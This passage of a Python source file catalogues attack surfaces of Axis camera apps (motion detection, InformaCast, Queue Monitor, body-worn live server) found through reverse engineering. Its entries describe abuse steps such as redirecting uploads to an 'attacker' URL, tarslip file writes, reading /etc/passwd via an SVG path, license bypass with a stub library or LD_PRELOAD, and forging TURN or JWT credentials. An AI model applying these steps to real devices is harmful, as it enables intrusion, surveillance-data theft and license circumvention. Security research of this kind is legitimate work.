           may trigger libexpat vulnerabilities. Check NVD for libexpat CVEs applicable to
           version bundled with this firmware.
        """
        result = {
            'app_id': 143440,
            'app_name': 'AXIS Video Motion Detection 4',
            'binary_name': 'vmd',
            'version': '4.4.4',
            'arch': 'ARM32 armhf stripped',
            'cgi': 'administrator /control.cgi (admin-only)',
            'libs': [
                'libaxparameter.so.1', 'libcapture.so.0', 'libgmodule-2.0.so.0',
                'libaxhttp.so', 'libaxevent.so.1', 'libscene.so', 'libgeometry.so',
                'libfixmath.so.0', 'libexpat.so.1', 'libglib-utils.so', 'libaxlog.so',
            ],
            'cgi_handlers': ['CGI_Handler', 'Onvif_CGI_Handler'],
            'filter_classes': [
                'ExclusionFilter', 'SwayingFilter', 'SizeFilterPercent',
                'SizeFilterPerspective', 'ObjectLifetimeFilter', 'LowConfidentObjectFilter',
                'PerspectiveFilterExternalData',
            ],
            'attack_paths': [
                {
                    'id': 'VMD-1',
                    'title': 'ONVIF CGI handler malformed message crash',
                    'mechanism': 'Onvif_CGI_Handler parses ONVIF protocol; malformed ONVIF payload may crash or corrupt state',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Admin-level auth to submit ONVIF CGI request',
                },
                {
                    'id': 'VMD-2',
                    'title': 'AlarmData::didTriggerAlarm — object ID OOB',
                    'mechanism': '"Could not find object with id %i" — integer ID from CGI; out-of-range may OOB-read object array',
                    'severity': 'LOW',
                    'prerequisite': 'Admin-level auth',
                },
                {
                    'id': 'VMD-3',
                    'title': 'libexpat XML config parsing',
                    'mechanism': 'VMD config written via CGI then parsed by libexpat.so.1; malformed XML in config → libexpat vuln surface',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Admin-level auth to write config',
                },
                {
                    'id': 'VMD-4',
                    'title': 'libscene.so / libgeometry.so substitution',
                    'mechanism': 'Custom scene libs loaded from firmware; if path overridable by ACAP → code exec',
                    'severity': 'LOW',
                    'prerequisite': 'Write access to lib path',
                },
            ],
        }
        return result

    def informacast_surface(self) -> dict:
        """
        AXIS Speaker Functionality for Singlewire InformaCast (InformaCastAcap) surface.

        appId: 414050  binary: InformaCastAcap  version: 1.0.8  arch: ARM32 armhf NOT STRIPPED
        Identical structure to UCS/SipThirdPartyIntegration — license gate + daemon dependency sentinel.

        Key findings:

        1. informacast-client service dependency gate (post_install.sh)
           `test -f /usr/lib/systemd/system/informacast-client.service || exit 77`
           ACAP installation aborted if informacast-client systemd unit absent.
           Same spoofing vector as UCS-1: touch the unit file to satisfy check without real service.

        2. /etc/dynamic/informacast-client/enabled flag
           Binary creates/removes /etc/dynamic/informacast-client/enabled to signal service.
           If another ACAP writes this flag, InformaCast integration appears active without license.

        3. Credential parameters: ServerAddress + ServerPort
           param.conf: ServerAddress="" (empty default) + ServerPort="8081"
           informacast-client connects to configured address:8081 (cleartext by default).
           If ServerAddress is operator-writable → SSRF to attacker's InformaCast server.
           Port 8081 is the default Singlewire InformaCast server port.

        4. License check identical to UCS pattern
           licensekey_verify + licensekey_verify_ex + licensekey_dyn_verify_ex
           has_valid_informacast_license function (vs UCS's has_valid_license).
           Same dlopen bypass via stub liblicensekey.so.

        5. LD_PRELOAD detection not confirmed (unlike UCS which explicitly tests it)
           InformaCast binary smaller — may have less hardening. Test LD_PRELOAD injection.
        """
        result = {
            'app_id': 414050,
            'app_name': 'AXIS Speaker Functionality for Singlewire InformaCast',
            'binary_name': 'InformaCastAcap',
            'version': '1.0.8',
            'arch': 'ARM32 armhf NOT STRIPPED',
            'service_dependency': '/usr/lib/systemd/system/informacast-client.service',
            'integration_flag_path': '/etc/dynamic/informacast-client/enabled',
            'params': {
                'ServerAddress': '(empty default — operator-writable)',
                'ServerPort': '8081 (Singlewire InformaCast default port)',
            },
            'libs': ['libgio-2.0.so.0', 'libgobject-2.0.so.0', 'libglib-2.0.so.0', 'liblicensekey.so.1'],
            'attack_paths': [
                {
                    'id': 'IC-1',
                    'title': 'ServerAddress SSRF — route audio alerts to attacker server',
                    'mechanism': (
                        'ServerAddress="" operator-writable. Set to attacker IP:8081. '
                        'informacast-client connects and sends alert broadcasts to attacker. '
                        'May include audio content, camera identity, alert metadata.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level axparameter write',
                },
                {
                    'id': 'IC-2',
                    'title': 'informacast-client service spoof — integration without license',
                    'mechanism': 'Create /usr/lib/systemd/system/informacast-client.service (minimal unit file); ACAP installs and integrates without real InformaCast client',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Write access to /usr/lib/systemd/system/ (requires elevated camera access)',
                },
                {
                    'id': 'IC-3',
                    'title': 'liblicensekey.so stub bypass (no LD_PRELOAD detection confirmed)',
                    'mechanism': 'LD_PRELOAD detection not confirmed unlike UCS. LD_PRELOAD injection of stub liblicensekey.so may work directly.',
                    'severity': 'HIGH',
                    'prerequisite': 'ACAP process user ability to set LD_PRELOAD (via another ACAP or shell)',
                },
            ],
        }
        return result

    def queue_monitor_surface(self) -> dict:
        """
        AXIS Queue Monitor (tvqu) attack surface.

        appId: 211492  binary: tvqu  version: 3.0.20  arch: ARM32 armhf stripped
        Bundled: curl (not stripped), libmd5.so, libcjson.so.1, libsodium.so.23

        Architecture mirrors tvgd/tvpc (same codebase family — shared backup/restore pattern).
        Uses libsodium for data encryption before cloud upload (NaCl boxes).

        Key findings:

        1. Tarslip via .restore_backup CGI (confirmed class, same as tvgd/tvpc)
           "Untaring temp-restore-params-file.tar.gz to /tmp/backup"
           Operator-level .restore_backup CGI — upload malicious tar.gz with path traversal.

        2. parhandclient param dump — broader filter gap than tvgd
           "parhandclient getgroup root.tvqu | grep -v -e 'Counter0Name' -e 'Counter0OccName' -e 'Environment0' -e 'Build0'"
           WebReportUpload0User, WebReportUpload0ProxyUser written plaintext to /tmp/parambackup.txt.

        3. WebReportUpload0AllowInsecure — TLS bypass flag (operator-writable)
           Set to 1 to bypass TLS for report upload; combined with WebReportUpload0Url → SSRF.

        4. libsodium NaCl crypto — key derivation unknown
           crypto_box_easy_afternm, crypto_secretbox, crypto_scalarmult_base.
           Queue count data encrypted before cloud upload; if key is static → offline decryption.

        5. privacy.sh — systemd service manipulation script (runs as root)
           "off" action unmasks dbus-com.axis.Storage, storage-manager, storage-stability-helper.
           PRIV_IMG_URL third argument passed to script — potential SSRF if CGI feeds it.

        6. Viewer-level /.api CGI — queue count exposure
           Queue counts (people waiting, service time) available at viewer access level.
           Combined with anonymous="0" param option: potential PII exposure of wait behavior.
        """
        result = {
            'app_id': 211492,
            'app_name': 'AXIS Queue Monitor',
            'binary_name': 'tvqu',
            'version': '3.0.20',
            'arch': 'ARM32 armhf stripped',
            'cgi_endpoints': {
                'viewer': ['/.api'],
                'operator': ['/.apioperator', '/.restore_backup'],
                'administrator': ['/.apiadmin'],
            },
            'libs': [
                'libcurl.so.4', 'libgio-2.0.so.0', 'libgobject-2.0.so.0', 'libglib-2.0.so.0',
                'libaxhttp.so.1', 'libaxevent.so.1', 'libaxparameter.so.1', 'libvdostream.so.1',
                'liblicensekey.so.1', 'libjansson.so.4',
            ],
            'bundled': ['curl (NOT STRIPPED)', 'libmd5.so', 'libcjson.so.1', 'libsodium.so.23'],
            'crypto': ['crypto_box_easy_afternm', 'crypto_secretbox', 'crypto_scalarmult_base', 'crypto_box_beforenm'],
            'params_upload': {
                'WebReportUpload0Url': '(empty, operator-writable)',
                'WebReportUpload0AllowInsecure': '0 (TLS bypass flag)',
                'WebReportUpload0User': '(empty)',
                'WebReportUpload0Proxy': '(empty)',
                'Httppost0Url': '(empty, operator-writable)',
                'Httppost0AllowInsecure': '0',
            },
            'attack_paths': [
                {
                    'id': 'QM-1',
                    'title': 'Tarslip via .restore_backup operator CGI',
                    'mechanism': 'tar xzf /tmp/temp-restore-params-file.tar.gz -C /tmp/backup — no path traversal check; operator uploads malicious tar.gz → arbitrary file write',
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level auth',
                },
                {
                    'id': 'QM-2',
                    'title': 'WebReportUpload TLS bypass + SSRF',
                    'mechanism': 'Set WebReportUpload0AllowInsecure=1 + WebReportUpload0Url=http://attacker/; tvqu sends encrypted queue counts to attacker at ReportInterval',
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level axparam write',
                },
                {
                    'id': 'QM-3',
                    'title': 'parhandclient param dump — credential params to /tmp/parambackup.txt',
                    'mechanism': 'Filter excludes only 4 param groups; WebReportUpload0User, proxy creds written plaintext to /tmp/',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Read access to /tmp/ (local process or via .restore_backup)',
                },
                {
                    'id': 'QM-4',
                    'title': 'libsodium key extraction → queue data decryption',
                    'mechanism': 'NaCl key derivation unknown; if static or per-firmware → offline decryption of captured queue uploads',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Capture of upload data + key derivation reverse',
                },
            ],
            'privacy_shell': {
                'path': '/usr/local/packages/tvqu/anon/privacy.sh',
                'runs_as': 'root (via postinst.sh)',
                'systemd_targets': ['dbus-com.axis.Storage.service', 'storage-manager', 'storage-stability-helper'],
            },
            'license_gate': 'liblicensekey.so.1',
        }
        return result

    def loitering_guard_surface(self) -> dict:
        """
        AXIS Loitering Guard (loiteringguard) attack surface.

        appId: 46775  binary: loiteringguard  version: 2.3.8  arch: ARM32 armhf stripped
        CGI: administrator /control.cgi only. LICENSEPAGE: none (no liblicensekey.so).

        Same libscene.so/libgeometry.so/libfixmath.so stack as VMD 4.4.4.
        Multi-camera support via SocketCameraContainer (opens device file descriptors to remote cameras).

        Key findings:

        1. SocketCameraContainer — multi-camera socket connections
           Connects to other cameras via socket (OpenCameraDevice → /dev/cam0 fallback).
           If camera host/port configurable via admin control.cgi JSON → socket SSRF.

        2. libscene.so / libgeometry.so — same substitution surface as VMD/VMD3
           Proprietary Axis scene libs from firmware path.
           Substitution with malicious .so → code exec.

        3. AlarmOverlayHandler + AlarmDataContainer
           updateBoundingBoxContainerForActiveProfiles takes AlarmDataContainer bounding boxes.
           Malformed bounding box coordinates in zone config → potential geometry crash.

        4. MOTE disconnect tracking (IDD file version check)
           IDD file has version field; IDD version too low → different code branch.
           If IDD file writable by co-resident ACAP → version manipulation.
        """
        result = {
            'app_id': 46775,
            'app_name': 'AXIS Loitering Guard',
            'binary_name': 'loiteringguard',
            'version': '2.3.8',
            'arch': 'ARM32 armhf stripped',
            'cgi': 'administrator /control.cgi (admin-only)',
            'license_page': 'none',
            'libs': [
                'libaxparameter.so.1', 'libgmodule-2.0.so.0', 'libgio-2.0.so.0',
                'libaxhttp.so', 'libgobject-2.0.so.0', 'libaxevent.so.1', 'libglib-2.0.so.0',
                'libscene.so', 'libgeometry.so', 'libfixmath.so.0', 'libglib-utils.so', 'libaxlog.so',
            ],
            'classes': [
                'SocketCameraContainer', 'CGI_Handler', 'AlarmOverlayHandler',
                'AlarmDataContainer', 'ParseConfig', 'MoteSceneParser', 'API_VersionHandler',
            ],
            'attack_paths': [
                {
                    'id': 'LG-1',
                    'title': 'SocketCameraContainer SSRF via admin control.cgi',
                    'mechanism': 'Multi-camera socket connection target from CGI JSON; attacker-controlled camera host → socket SSRF',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Admin-level auth',
                },
                {
                    'id': 'LG-2',
                    'title': 'libscene.so / libgeometry.so substitution',
                    'mechanism': 'Same as VMD-4: proprietary scene libs from firmware path; writable path → malicious .so injection',
                    'severity': 'LOW',
                    'prerequisite': 'Write access to lib path',
                },
            ],
        }
        return result

    def vmd_458_surface(self) -> dict:
        """
        AXIS Video Motion Detection 4.5.8 (vmd) attack surface — diff from 4.4.4.

        appId: 143440  binary: vmd  version: 4.5.8  arch: aarch64 stripped
        Same family as VMD 4.4.4 (appId identical). CGI: administrator /control.cgi.

        Changes from 4.4.4:
          - Architecture upgrade: 4.4.4 was ARM32; 4.5.8 is aarch64.
          - XML_SetNamespaceDeclHandler added: namespace-aware XML parsing in libexpat.
          - libscene.so, libgeometry.so, libfixmath.so.0 still loaded (same substitution surface).
          - ONVIF CGI handler confirmed still present.

        4.5.8 specific additions:
          - XML namespace declaration handler: XML namespaces now declared in config.
            Attack: malformed namespace declarations in VMD XML config → namespace confusion
            in libexpat → potential memory corruption.
          - aarch64 binary: bypasses any ARM32-specific exploit mitigations.
        """
        result = {
            'app_id': 143440,
            'app_name': 'AXIS Video Motion Detection 4',
            'binary_name': 'vmd',
            'version': '4.5.8',
            'arch': 'aarch64 stripped (upgraded from ARM32 in 4.4.4)',
            'cgi': 'administrator /control.cgi (admin-only)',
            'libs': ['libscene.so', 'libgeometry.so', 'libfixmath.so.0', 'libexpat.so.1', 'libaxparameter.so.1'],
            'xml_additions': 'XML_SetNamespaceDeclHandler — namespace-aware XML parsing added in 4.5.8',
            'attack_paths': [
                {
                    'id': 'VMD45-1',
                    'title': 'libexpat XML namespace confusion via malformed namespace declaration',
                    'mechanism': 'XML_SetNamespaceDeclHandler installed; malformed xmlns declarations in VMD config may trigger libexpat namespace parsing edge case → heap corruption',
                    'severity': 'LOW',
                    'prerequisite': 'Admin-level auth to write VMD config',
                },
                {
                    'id': 'VMD45-2',
                    'title': 'libscene.so / libgeometry.so substitution (same as VMD 4.4.4)',
                    'mechanism': 'Proprietary scene libs from firmware path; writable path → malicious .so injection',
                    'severity': 'LOW',
                    'prerequisite': 'Write access to lib path',
                },
            ],
        }
        return result

    def vmd3_lua_surface(self) -> dict:
        """
        AXIS Video Motion Detection 3 (VMD3) attack surface.

        appId: 46396  APPTYPE: lua  version: 3.2.0  arch: ARTPEC-5 (Lua runtime)
        Files: combined.lua (encrypted), encpwd (key blob), VMD3.xml (config).
        LICENSEPAGE=none.

        Same encrypted-Lua pattern as Digital Auto Tracking — all Lua in one combined.lua,
        decrypted at runtime by ARTPEC-5 firmware's Lua rule engine.

        VMD3.xml: geometry-based zone config with polygon definitions, timer, sensitivity.
        The XML defines detection zones as x/y coordinate polygons (float, range -1.0 to 1.0).

        Key findings:

        1. Encrypted Lua — same attack path as DAT
           combined.lua is binary-encrypted; encpwd is per-package key blob.
           LD_PRELOAD hook on Lua runtime → intercept plaintext at decrypt time.

        2. VMD3.xml polygon coordinate injection
           Zone polygons defined as floating point x/y pairs in XML.
           "knownTypeName="geometry.polygon"" — custom geometry type parsed by firmware.
           Malformed float coordinates (NaN, Inf, extreme values) in zone config → geometry
           library floating-point exception or buffer overflow in zone rendering.

        3. ARTPEC-5 only — legacy target
           ARTPEC-5 cameras may not receive firmware updates; VMD3 on ARTPEC-5 cameras
           represents an extended attack surface on unpatched hardware.
        """
        result = {
            'app_id': 46396,
            'app_name': 'AXIS Video Motion Detection 3',
            'binary_name': 'combined.lua (encrypted)',
            'version': '3.2.0',
            'arch': 'ARTPEC-5 (Lua runtime)',
            'license_page': 'none',
            'encpwd': 'binary decryption key blob',
            'attack_paths': [
                {
                    'id': 'VMD3-1',
                    'title': 'Encrypted Lua source recovery via LD_PRELOAD hook',
                    'mechanism': 'Same as DAT-2: LD_PRELOAD on ARTPEC-5 Lua interpreter → intercept plaintext at decrypt time',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Code exec on ARTPEC-5 camera (LD_PRELOAD allowed on Lua interpreter)',
                },
                {
                    'id': 'VMD3-2',
                    'title': 'VMD3.xml polygon float injection — geometry exception',
                    'mechanism': 'Detection zone polygon coordinates in VMD3.xml parsed as floats by firmware geometry lib; NaN/Inf/extreme values → floating-point exception or geometry crash',
                    'severity': 'LOW',
                    'prerequisite': 'Write access to VMD3.xml (admin-level or filesystem)',
                },
            ],
        }
        return result

    def radar_data_visualizer_surface(self) -> dict:
        """
        AXIS Radar Data Visualizer (radardatavisualizer) attack surface.

        appId: 414283  binary: radardatavisualizer  version: 3.3.2  arch: aarch64 stripped
        CGI: administrator /control.cgi, viewer /consume.cgi

        Radar overlay visualizer — renders radar detection zones on video stream using cairo + resvg.
        Bundles libresvg.so.0 (Rust-based SVG renderer), Cairo, GStreamer, Pango, libcurl.

        Key findings:

        1. viewer /consume.cgi — radar data exposed at viewer level
           consume.cgi is viewer-accessible; provides radar visualization data (detected objects,
           zones, speed estimates) without operator/admin auth.
           axo_match_stream_id + vdo_stream_get — streams video with radar overlay to viewer.
           All radar targets on camera accessible to any viewer-level user.

        2. resvg_parse_tree_from_file — SVG file path from config
           "Failed to parse SVG file %s: %d" — %s is SVG file path.
           If SVG file path comes from axparam (admin-writable), set to /etc/passwd or other
           sensitive file → resvg attempts to parse as SVG → error message may leak file content
           or trigger resvg crash via malformed SVG.
           libresvg.so.0 is Rust-based (memory-safe) but SVG complexity attacks still possible.

        3. Boost library linking — complex template code surface
           Boost::format and Boost::io::basic_altstringstream in binary (from symbol mangling).
           Boost format strings: if format string is user-influenced → format string injection.

        4. D-Bus ObjectManager + org.freedesktop.DBus.ObjectManager
           Introspectable via standard D-Bus; enumerate all managed objects to find undocumented
           methods on the visualizer's D-Bus interface.

        5. libcurl bundled — RTSP stream from radar sensor
           radardatavisualizer connects to radar sensor; if sensor URL is operator-configured
           via axparam + libcurl is used → SSRF to attacker-controlled RTSP endpoint.
        """
        result = {
            'app_id': 414283,
            'app_name': 'AXIS Radar Data Visualizer',
            'binary_name': 'radardatavisualizer',
            'version': '3.3.2',
            'arch': 'aarch64 stripped',
            'cgi': {'viewer': '/consume.cgi', 'administrator': '/control.cgi'},
            'bundled_libs': [
                'libresvg.so.0.35.0 (Rust SVG renderer)', 'libcairo.so.2.11708.0',
                'libcurl.so.4.8.0', 'libpango-1.0.so.0', 'libgstreamer-1.0.so.0.2204.0',
            ],
            'attack_paths': [
                {
                    'id': 'RDV-1',
                    'title': 'Viewer-level radar target data exposure via /consume.cgi',
                    'mechanism': 'consume.cgi viewer-accessible; exposes detected radar targets, zones, speed data without elevated auth',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Viewer-level auth (lowest camera privilege)',
                },
                {
                    'id': 'RDV-2',
                    'title': 'SVG file path injection via axparam → resvg file read / crash',
                    'mechanism': '"Failed to parse SVG file %s" — path from config; set to /etc/passwd → resvg reads as SVG; error or content in log. libresvg crash via adversarial SVG.',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Admin-level axparam write to SVG path config',
                },
                {
                    'id': 'RDV-3',
                    'title': 'libcurl SSRF via radar sensor URL',
                    'mechanism': 'Radar sensor connection URL from operator/admin axparam; set to attacker RTSP server → SSRF + connection metadata leak',
                    'severity': 'MEDIUM',
                    'prerequisite': 'Operator or admin axparam write',
                },
            ],
        }
        return result

    def bw_lss_surface(self) -> dict:
        """
        AXIS Body Worn Live Self-hosted Server (BodyWornLiveSelfHosted) attack surface.

        package: AXIS_Body_Worn_Live_Self-hosted_Server
        version: 1.5.1 (W401), 1.0.0 (D3110), 2.0.0 (Oct 2025), 2.0.1 (Feb 2026)
        binary: BodyWornLiveSelfHosted (Go static; 1.5.1=11.8MB, 2.0.0=13.0MB, 2.0.1=13.1MB), rsignal (Rust), coturn/turnserver
        appId: unset in package.conf (APPID="")
        arch: W401 (ARTPEC-8 camera appliance); D3110 (body-worn dock)
        LICENSEPAGE: none
        source: https://www.axis.com/ftp/pub/axis/software/bw/ACAP/AXIS_Body_Worn_Live_Self-hosted_Server/

        BodyWornLiveSelfHosted is a Go server that runs a WebRTC/coturn media relay and
        signaling infrastructure directly on an Axis body-worn camera dock (W401/D3110).
        The binary ships a React SPA (react-router 7.5.3, react 19.1.0) in html/assets/.

        Internal Go packages (axteams-one/bws-webrtc-acap):
          internal/auth      — JWT issuance + STUN/TURN credential generation
          internal/cgi       — HTTP CGI routing (ServeHTTP dispatch)
          internal/cgi/cgis/auth      — auth CGI: getSignalingClientToken, getStunTurnTestCredentials
          internal/cgi/cgis/configure — configure CGI: configureSystem, deleteSystem, setServerConfig,
                                        setPrivacyConfig, getPrivacyConfig, getSystemConfig, getSystems
          internal/peerhub   — peer connection tracking: handlePeerConnectedEvent,
                               handleStreamAvailableEvent, handleStreamStartedOrResumedEvent
          internal/coturn    — coturn config/credential management
          internal/rsignal   — rsignal subprocess management
          internal/metrics   — Prometheus metrics exporter (:9446/metrics/core, :9641/metrics/coturn)

        coturn:
          turnserver binary bundles libgssapi_krb5.so.2, libkrb5.so.3 — Kerberos auth support
          libmicrohttpd.so.12 — embedded HTTP server for coturn admin interface
          libprom.so — Prometheus client in coturn

        rsignal: Rust binary (serde_json, regex, httpdate) — signaling relay side-car

        IDD plugins (idd/plugins/):
          bwlcore: curl localhost:9446/local/BodyWornLiveSelfHosted/metrics/core (no auth check in script)
          bws_webrtc_coturn_metrics: curl localhost:9641/local/BodyWornLiveSelfHosted/metrics/coturn
          context: parhandclient getlist + gdbus call com.axis.BasicDeviceInfo1 — device serial/firmware leak
          device_configurations: parhandclient getgroup root.HTTPS + cat /etc/acap/conf/packageparser.conf
          storage_properties: busctl call com.axis.storage.StorageManager1 + SD card CID dump

        pre-uninstall.sh:
          gdbus call com.axis.PolicyKitCert.CertSetDeleteUnpriv BodyWornLiveSelfHosted1
          Called on BOTH uninstall AND upgrade — cert set deleted between upgrade steps → TLS gap

        2.0.x new attack surface (2.0.0 Oct 2025, 2.0.1 Feb 2026 — EAPs confirmed):
          - GraphQL mutations: addBWLStandaloneConfiguration, createBWLStandaloneConfigurationRequest,
            deleteBWLStandaloneConfiguration — standalone config write/delete at operator level
          - ENV_AXIS_SIGNAL_SERVER_TARGET_CA_PATH (2.0.1) / ENV_AXIS_SIGNAL_SERVER_CA_PATH (2.0.0) —
            custom CA path env var; user-controlled = trust anchor substitution
          - com.axis.bodyworn.positioning@v1.0.0 — new positioning subsystem with VAPIX events;
            new event types: stream started/stopped, positioning event
          - wss://127.0.0.1:8082/client — localhost WebSocket endpoint (new port in 2.0)
          - com.axis.HTTPConf1.VAPIXServiceAccounts1.GetCredentials — VAPIX service account cred fetch
          - /usr/local/packages/BodyWornLiveSelfHosted/metrics.sock — Unix socket metrics (2.0);
            if world-writable, any local ACAP reads live Prometheus metrics
          - Workload auto-restart on crash: "Queuing restart to start workload after unexpected exit"

        Key RE findings:
        1. getStunTurnTestCredentials — auth CGI exports TURN test credentials; uses crypto/hmac (HMAC-SHA1
           TURN credential model RFC 8489 §9.2). If auth check is operator-level or lower, attacker
           with operator auth gets TURN shared secret → media relay abuse.
        2. configureSystem/deleteSystem — configure CGI has destructive system ops; deleteSystem with
           admin creds wipes body-worn system configuration.
        3. getSignalingClientToken — JWT issued by auth CGI using golang-jwt/jwt v5.2.2; JWT signing
           secret in process memory; if weak entropy or predictable, signaling channel takeover.
        4. Metrics ports (localhost:9446, :9641) — IDD plugins fetch without auth; if device has an
           SSRF primitive (common in AXIS ACAPs), attacker reaches Prometheus scrape and gets full
           session/peer/stream metrics.
        5. Kerberos in coturn — libgssapi_krb5 bundled; TURN server with Kerberos auth misconfigured
           to accept unauthenticated clients falls back to auth-any (confirmed in turnserver strings).
        6. (2.0.x) GraphQL standalone mutations accessible at operator level — destructive ops.
        7. (2.0.x) ENV_AXIS_SIGNAL_SERVER_TARGET_CA_PATH — env var CA path injection = MitM signal server.
        8. (2.0.x) VAPIXServiceAccounts1.GetCredentials — service account creds fetched in LSS context.
        """
        result = {
            'app': 'AXIS Body Worn Live Self-hosted Server',
            'package': 'AXIS_Body_Worn_Live_Self-hosted_Server',
            'version': '1.5.1',
            'arch': 'W401 (ARTPEC-8 appliance), D3110 (body-worn dock)',
            'binary': 'BodyWornLiveSelfHosted (Go static)',
            'appId': '(unset — APPID="" in package.conf)',
            'run_as': 'ACAP sandbox user',
            'license_page': 'none',
            'bundled_components': [
                'coturn/turnserver (libgssapi_krb5.so.2, libkrb5.so.3, libmicrohttpd.so.12, libprom.so, libevent-2.1.so.7)',
                'rsignal (Rust binary — signaling relay)',
                'React SPA: react 19.1.0, react-router 7.5.3, cookie 1.0.2',
            ],
            'internal_packages': [
                'internal/auth — JWT + TURN credential generation (HMAC)',
                'internal/cgi/cgis/auth — auth CGI',
                'internal/cgi/cgis/configure — configure CGI',
                'internal/peerhub — WebRTC peer tracking',
                'internal/coturn — coturn integration',
                'internal/metrics — Prometheus :9446/:9641',
            ],
            'idd_plugins': [
                'bwlcore: curl localhost:9446/metrics/core (no auth)',
                'bws_webrtc_coturn_metrics: curl localhost:9641/metrics/coturn',
                'context: parhandclient + gdbus BasicDeviceInfo1',
                'device_configurations: parhandclient root.HTTPS + packageparser.conf',
                'storage_properties: busctl StorageManager1 + SD CID',
            ],
            'attack_paths': [
                {
                    'id': 'LSS-1',
                    'title': 'TURN shared secret exposure via getStunTurnTestCredentials CGI',
                    'mechanism': (
                        'auth CGI method getStunTurnTestCredentials returns time-based TURN credentials '
                        '(RFC 8489 §9.2 HMAC-SHA1 model). If CGI is accessible at operator auth level, '
                        'attacker reads TURN shared secret → forges credentials → relays media through '
                        'camera TURN server → media interception or DoS of body-worn video streams.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level camera auth',
                },
                {
                    'id': 'LSS-2',
                    'title': 'Destructive configure CGI — deleteSystem / setServerConfig',
                    'mechanism': (
                        'configure CGI exposes configureSystem, deleteSystem, setServerConfig, setPrivacyConfig. '
                        'deleteSystem at admin level wipes BWS system config. setServerConfig with attacker '
                        'TURN endpoint → SSRF to attacker relay server. setPrivacyConfig can toggle video '
                        'privacy masking state — privacy DoS similar to LPS-3.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Admin-level camera auth',
                },
                {
                    'id': 'LSS-3',
                    'title': 'JWT signaling token secret in Go process memory',
                    'mechanism': (
                        'getSignalingClientToken issues JWTs (golang-jwt/jwt v5.2.2). JWT signing secret '
                        'stored in BodyWornLiveSelfHosted process memory; extractable via /proc/PID/mem '
                        'if process user matches. Known signing secret → forge client JWT → unauthorized '
                        'signaling channel access → impersonate body-worn camera client.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Admin shell or /proc access on W401 device',
                },
                {
                    'id': 'LSS-4',
                    'title': 'Prometheus metrics ports localhost:9446 / :9641 — no IDD auth check',
                    'mechanism': (
                        'bwlcore and bws_webrtc_coturn_metrics plugins fetch localhost:9446 and :9641 '
                        'respectively; no auth in shell scripts. If device has any SSRF primitive '
                        '(common — sbplayer UpdateURL, rdv libcurl, etc.), attacker fetches full '
                        'Prometheus metrics: peer counts, stream states, coturn session counts, restart totals.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'SSRF primitive on device (or admin shell)',
                },
                {
                    'id': 'LSS-5',
                    'title': 'Kerberos in bundled coturn — auth-any fallback',
                    'mechanism': (
                        'coturn/turnserver bundles libgssapi_krb5.so.2 and libkrb5.so.3. turnserver strings '
                        'confirm auth-any / AuthANY option. In default AXIS BWS deployments, coturn is '
                        'typically not connected to a Kerberos KDC; if auth-any is accidentally active, '
                        'unauthenticated clients relay media through the TURN server.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'Network access to TURN port 3478/5349',
                },
                {
                    'id': 'LSS-6',
                    'title': 'D-Bus cert set deleted on upgrade (pre-uninstall.sh)',
                    'mechanism': (
                        'pre-uninstall.sh calls PolicyKitCert.CertSetDeleteUnpriv BodyWornLiveSelfHosted1 '
                        'on both uninstall AND upgrade. Certificate set is deleted between old package '
                        'removal and new package install. During upgrade window, TLS connections using '
                        'that cert set may fail or fall back to a weaker profile.'
                    ),
                    'severity': 'LOW',
                    'prerequisite': 'ACAP package upgrade event',
                    'version': '1.5.1+',
                },
                {
                    'id': 'LSS-7',
                    'title': '2.0.x: GraphQL standalone config mutations at operator level',
                    'mechanism': (
                        '2.0.0+ adds GraphQL mutations addBWLStandaloneConfiguration, '
                        'createBWLStandaloneConfigurationRequest, deleteBWLStandaloneConfiguration. '
                        'Confirmed in binary strings. These configure/destroy standalone deployment configs. '
                        'Operator-level access = reconfigure or delete BWS standalone config without admin rights. '
                        'deleteBWLStandaloneConfiguration → drops active body-worn system configuration → '
                        'body-worn cameras lose video relay capability (operational DoS).'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level camera auth (2.0.0+)',
                    'version': '2.0.0+',
                },
                {
                    'id': 'LSS-8',
                    'title': '2.0.1: ENV_AXIS_SIGNAL_SERVER_TARGET_CA_PATH — CA path injection',
                    'mechanism': (
                        'ENV_AXIS_SIGNAL_SERVER_TARGET_CA_PATH env var in 2.0.1 (SIGNAL_SERVER_CA_PATH in 2.0.0) '
                        'sets the CA bundle path for signal server TLS verification. If this env var is '
                        'user-controllable via axparameter or ACAP config interface, attacker substitutes '
                        'an attacker-controlled CA cert → MitM of BodyWornLiveSelfHosted ↔ signal server TLS '
                        '→ intercept JWT tokens, peer connection metadata, stream routing.'
                    ),
                    'severity': 'HIGH',
                    'prerequisite': 'Operator-level axparameter write or ACAP restart with injected env (2.0.x)',
                    'version': '2.0.0+',
                },
                {
                    'id': 'LSS-9',
                    'title': '2.0.x: VAPIXServiceAccounts1.GetCredentials in LSS context',
                    'mechanism': (
                        'com.axis.HTTPConf1.VAPIXServiceAccounts1.GetCredentials is called from '
                        'BodyWornLiveSelfHosted context (confirmed in 2.0.1 strings). LSS fetches VAPIX '
                        'service account credentials to authenticate against camera VAPIX APIs. '
                        'If the service account creds are returned via an unprotected IDD plugin or '
                        'Prometheus metrics endpoint, attacker reads plaintext VAPIX service credentials → '
                        'full VAPIX API access as service account.'
                    ),
                    'severity': 'MEDIUM',
                    'prerequisite': 'SSRF to localhost IDD plugin or metrics.sock (2.0.x)',
                    'version': '2.0.0+',
                },
                {
                    'id': 'LSS-10',
                    'title': '2.0.x: metrics.sock Unix socket — access control check',
                    'mechanism': (
                        '/usr/local/packages/BodyWornLiveSelfHosted/metrics.sock is a Unix domain socket '
                        'for Prometheus metrics in 2.0.x. ACAP sandbox does not guarantee correct socket '
                        'permissions. If permissions are 0666 or group-writable and another ACAP shares '
